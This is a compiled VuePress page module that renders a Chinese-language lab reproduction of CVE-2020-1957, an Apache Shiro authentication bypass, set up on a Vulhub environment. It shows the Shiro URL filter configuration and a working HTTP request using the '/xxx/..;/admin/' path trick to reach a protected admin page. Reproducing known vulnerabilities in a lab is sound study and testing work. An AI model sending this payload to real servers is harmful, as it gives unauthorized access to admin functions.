import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as d,c as l,a as e,b as i,d as a,e as c}from"./app-58e4a7d6.js";const r={},s=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),u=e("p",null,"Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。",-1),h=e("p",null,[i("在Apache Shiro 1.5.2以前的版本中，在使用Spring动态控制器时，攻击者通过构造"),e("code",null,"..;"),i("这样的跳转，可以绕过Shiro中对目录的权限限制。")],-1),p=e("p",null,"参考链接：",-1),m={href:"https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139",target:"_blank",rel:"noopener noreferrer"},v={href:"https://xz.aliyun.com/t/8281",target:"_blank",rel:"noopener noreferrer"},f={href:"https://blog.spoock.com/2020/05/09/cve-2020-1957/",target:"_blank",rel:"noopener noreferrer"},b=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看首页。</p><p>这个应用中对URL权限的配置如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>@Bean
public ShiroFilterChainDefinition shiroFilterChainDefinition() {
    DefaultShiroFilterChainDefinition chainDefinition = new DefaultShiroFilterChainDefinition();
    chainDefinition.addPathDefinition(&quot;/login.html&quot;, &quot;authc&quot;); // need to accept POSTs from the login form
    chainDefinition.addPathDefinition(&quot;/logout&quot;, &quot;logout&quot;);
    chainDefinition.addPathDefinition(&quot;/admin/**&quot;, &quot;authc&quot;);
    return chainDefinition;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>直接请求管理页面<code>/admin/</code>，无法访问，将会被重定向到登录页面：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /admin HTTP/1.1
Host: your-vps-ip:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011007191.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /xxx/..;/admin/ HTTP/1.1
Host: your-vps-ip:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011008871.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13);function g(_,x){const n=o("ExternalLinkIcon");return d(),l("div",null,[s,u,h,p,e("ul",null,[e("li",null,[e("a",m,[i("https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce#diff-98f7bc5c0391389e56531f8b3754081aL139"),a(n)])]),e("li",null,[e("a",v,[i("https://xz.aliyun.com/t/8281"),a(n)])]),e("li",null,[e("a",f,[i("https://blog.spoock.com/2020/05/09/cve-2020-1957/"),a(n)])])]),b])}const q=t(r,[["render",g],["__file","Apache Shiro 认证绕过漏洞 CVE-2020-1957.html.vue"]]);export{q as default};
